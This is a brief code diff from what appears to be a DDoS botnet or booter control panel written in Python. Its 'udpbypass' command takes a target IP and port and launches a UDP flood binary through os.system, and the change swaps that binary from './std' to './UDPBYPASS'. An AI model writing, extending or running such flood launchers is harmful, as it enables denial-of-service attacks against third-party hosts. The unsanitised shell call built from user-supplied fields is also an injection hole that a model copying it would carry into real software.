@@ -263,7 +263,7 @@ def main():
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
-                os.system(f'./std {ip} {port}')
+                os.system(f'./UDPBYPASS {ip} {port}')
             except IndexError:
                 print('Usage: udpbypass <ip> <port>')
                 print('Example: udpbypass 1.1.1.1 80')
